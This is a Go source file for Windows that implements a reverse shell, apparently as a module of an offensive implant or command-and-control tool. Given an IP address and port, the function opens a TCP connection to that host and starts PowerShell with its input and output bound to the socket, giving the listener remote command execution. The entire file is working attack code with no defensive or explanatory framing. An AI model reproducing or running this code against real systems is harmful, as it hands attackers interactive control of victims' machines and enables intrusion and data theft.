//go:build windows
// +build windows

package reverseshell

import (
	"errors"
	"fmt"
	"strconv"
	"strings"
	"unsafe"

	"golang.org/x/sys/windows"
)

func ReverseShell(args []string) (string, error) {
	if len(args) < 2 {
		return "", errors.New("Not Enough Args")
	}
	var WORD uint32
	var err error
	var port int
	var ip []int
	port, err = strconv.Atoi(args[1])
	if err != nil {
		if err != nil {
			return "Failed to split", err
		}
	}
	split := strings.Split(args[0], ".")
	for _, chunk := range split {
		ipp, err := strconv.Atoi(chunk)
		if err != nil {
			return "Failed to convert to ip to bytes", err
		}
		ip = append(ip, ipp)
	}
	var addr [4]byte
	for i, bytee := range ip {
		fmt.Println(bytee)
		addr[i] = byte(bytee)
	}
	wsaData := &windows.WSAData{}
	sock := &windows.SockaddrInet4{}
	windows.WSAStartup(WORD, wsaData)
	socketHandle, err := windows.WSASocket(windows.AF_INET, windows.SOCK_STREAM, windows.IPPROTO_TCP, nil, 0, 0)
	if err != nil {
		return "Failed to create WSA Socket", err
	}
	sock.Port = port
	sock.Addr = addr
	err = windows.Connect(socketHandle, sock)
	if err != nil {
		return "Error connecting!", err
	}
	tmp := windows.StartupInfo{}
	pi := &windows.ProcessInformation{}
	sa := &windows.StartupInfo{}
	sa.Cb = uint32(unsafe.Sizeof(tmp))
	sa.Flags = (windows.STARTF_USESTDHANDLES | windows.STARTF_USESHOWWINDOW)
	sa.StdInput = socketHandle
	sa.StdOutput = socketHandle
	sa.StdErr = socketHandle
	//cmd := windows.StringToUTF16Ptr("C:\\windows\\system32\\cmd.exe")
	pwsh := windows.StringToUTF16Ptr("C:\\windows\\system32\\WindowsPowershell\\v1.0\\powershell.exe")
	windows.CreateProcess(nil, pwsh, nil, nil, true, 0, nil, nil, sa, pi)
	return "Check Your Listener", nil
}
